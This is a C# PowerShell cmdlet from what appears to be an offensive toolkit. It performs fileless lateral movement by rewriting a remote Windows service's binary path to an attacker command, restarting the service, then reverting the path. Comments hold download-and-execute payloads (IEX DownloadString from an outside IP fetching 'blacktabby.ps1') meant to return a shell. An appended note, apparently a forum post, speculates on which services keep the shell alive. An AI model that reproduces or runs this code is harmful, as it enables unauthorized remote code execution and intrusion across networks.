using System;
using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Threading;
using TurtleToolKitServices;


namespace TurtleToolKit
{
    [Cmdlet(VerbsLifecycle.Invoke, "FileLessLateralMovement")] // <- seeting cmdlet name and verbs
    [Alias("INVFLM")] //<- cmdlet alias
    public class InvokeFileLessLateralMovement : Cmdlet
    {
        [Parameter(Mandatory = true)] [Alias("h")] public string targetHost{ get; set; }
        [Parameter(Mandatory = true)] [Alias("c")] public string command { get; set; }
        [Parameter(Mandatory = false)] [Alias("s")] public string targetService{ get; set; }

        protected override void BeginProcessing()
        {
            base.BeginProcessing();
        }

        // Process each item in pipeline
        protected override void ProcessRecord()
        {
            base.ProcessRecord();
            // User Passed service target that one
            if (!string.IsNullOrWhiteSpace(targetService))
            {
                WriteVerbose("Service Passed -> " + targetService);
                WriteVerbose("Command Passed -> " + command);
                if (!ExecuteFileLessLateralMovement(targetHost:targetHost,serviceName: targetService, payload:command))
                {
                    WriteWarning("Failed to execute fileLess pivot");
                    return;
                }
                WriteVerbose("Shoulda worked..Check if you got a shell papa");
                return;
            }
            /// no service passed target bits admin
            WriteVerbose("No Service Passed Targeting BITS service by Default");
            WriteVerbose("Command Passed -> " + command);
            if (!ExecuteFileLessLateralMovement(targetHost: targetHost, payload: command))
            {
                WriteWarning("Failed to execute fileLess pivot");
                return;
            }
            WriteVerbose("Shoulda worked..Check if you got a shell papa");
            return;
        }
        // EndProcessing Used to clean up cmdlet
        protected override void EndProcessing() { base.EndProcessing(); }
        // Handle abnormal termination
        protected override void StopProcessing() { base.StopProcessing(); }

        public static bool ExecuteFileLessLateralMovement(string targetHost, string payload , string serviceName="BITS" )
        // payload example -> "c:\\windows\\system32\\cmd.exe /c c:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe -c `"IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.75/blacktabby.ps1')`"")
        // payload example -> "c:\\windows\\system32\\cmd.exe /c c:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe -c `"`$test=((IWR -Uri 'http://192.168.49.75/blacktabby.ps1' -UseBasicParsing).RawContent);`$len=`$test.length;`$test.SubString(`$len-(`$len -198))|IEX`""
        {
            string originalBinPath = "";
            // get original bin path
            if (!Services.QueryRemoteServiceBinaryPath(targetHost, serviceName, ref originalBinPath))
            {
                Console.WriteLine("You probably dont have admin access to this machine via this user");
                return false;
            }
            //Console.WriteLine("Original Service bin Path {0} -> {1}", targetHost, originalBinPath);
            // edit binpath to payload
            if (!Services.EditRemoteServiceBinary(targetHost, serviceName, payload))
            {
                Console.WriteLine("Failed to edit binary path");
                return false;
            }
            Services.QueryRemoteServiceBinaryPath(targetHost, serviceName, ref payload);
            Console.WriteLine("New Service bin Path installed");
            // stop service if started
            Console.WriteLine("Attempting to stop service...");
            var stopRes = Services.StopRemoteService(targetHost, serviceName);
            if (!stopRes)
                Console.WriteLine("Failed to stop service but thats OK!\nAttempting to start with new binpath");
            Thread.Sleep(5000);
            // start service
            var res = Services.StartRemoteService(targetHost, serviceName);
            int dwErr = Marshal.GetLastWin32Error();
            if (!res && dwErr != 1053) {
                Console.WriteLine("service start failed");
            } else
            {
                Console.WriteLine("service start succeeded");
            }
            // revert service back to original state
            if (!Services.EditRemoteServiceBinary(targetHost, serviceName, originalBinPath)) {
                Console.WriteLine("Failed to revert service...this isnt good lol");
                return false;
             }
            Services.QueryRemoteServiceBinaryPath(targetHost, serviceName, ref originalBinPath);
            Console.WriteLine("Reverted Service bin Path {0} -> {1}", targetHost, originalBinPath);
            return true;
        }
    }
}

/*
 * 
 * First of all - thank you so much for the folk who have highlighted this peculiarity!

I can shed a little bit of light on this, but not enough to fully answer the question WHYYYY?

It seems that if the service binaryPath is overwritten, and the system rebooted, then this service becomes cooperative.
It will still fail to "launch" but that is to be expected - the failure takes enough time for a shell comes back and the shell stays up.
Changing it back to the original svchost command and rebooting again restores the original situation of SensorService not working.

As such, my hypothesis is that for some reason, starting SensorService fails really/too quickly IFF at boot-time it was configured as a specific svchost command.
Comparing the two services (SensorService and BTAGService), we can see that they are respectively (without manipulation) defined as C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p and C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted.

Looking at https://nasbench.medium.com/demystif...s-508e9114e747, we learn that The “P” flag enforces different policies: DynamicCodePolicy, BinarySignaturePolicy and ExtensionPolicy. It may be that the services manager observes this at boot time, and deals with the services differently. Trying it out, the presence of the -p flag on its own does not seem to make a difference.
The other difference is LocalSystemNetworkRestricted vs LocalServiceNetworkRestricted - it could be that the requirements and assumptions for each kind of service group are different on the OS. Low and behold, changing the SensorService to run a LocalServiceNetworkRestricted command make it fail slow enough to be usable.

Why the differentiation between boot-time svchost command parameters (LocalSystemNetworkRestricted vs LocalServiceNetworkRestricted) - who knows, but this seems to decide whether the service is suitable or not.

My best guess is that LocalSystemNetworkRestricted service group has a stricter SLA on start times until they need to respond to polls than LocalServiceNetworkRestricted. Logically looking at it, one would expect local system to be more predictable and reliable than a local service. At that point the ServiceManager will load the list of services from the registry at boot time, and make its optimisations dynamically based on what it is seeing - thus making the timeouts for LocalSystemNetworkRestricted shorter than for LocalServiceNetworkRestricted. This however, is just a blind guess...and I really don't want to get a debugger out to figure this out further.

So definitely not a full answer, but perhaps this gives someone direction to go chase this further and/or confirm/deny my guess above. 

*/
